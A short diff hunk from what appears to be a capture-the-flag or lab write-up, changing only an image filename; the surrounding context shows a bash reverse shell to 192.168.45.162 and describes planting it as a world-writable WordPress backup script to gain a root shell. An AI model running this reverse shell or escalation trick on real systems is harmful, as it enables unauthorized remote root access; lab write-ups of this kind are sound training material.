@@ -308,4 +308,4 @@ bash -i >& /dev/tcp/192.168.45.162/80 0>&1
 
 Then we can place this within the `/var/www/html/wordpress/backup_scripts` directory as `backup-post` after running `chmod 777` on it. We would get a reverse shell as `root` after waiting for a bit:
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (12).png" alt=""><figcaption></figcaption></figure>
